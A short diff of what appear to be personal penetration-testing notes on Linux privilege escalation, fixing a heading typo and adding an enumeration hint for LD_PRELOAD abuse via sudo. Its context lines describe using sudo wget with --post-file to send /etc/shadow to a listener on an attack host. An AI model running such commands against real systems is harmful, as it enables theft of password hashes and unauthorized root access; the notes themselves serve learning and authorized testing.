@@ -179,9 +179,10 @@ Using the intended functionality of an application to be able to exploit a syste
     But after `sudo -l` we see we have sudo permissions to wget.
     We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.
 
-## Excalation via LD_Preload
+## Escalation via LD_Preload
 Basically, preloading a malicious library to run as sudo
 - Enumeration
+    We're Looking for `env_keep+=LD_PRELOAD`
 ```
 sudo -l
 Matching Defaults entries for Chvxt3r on this host:
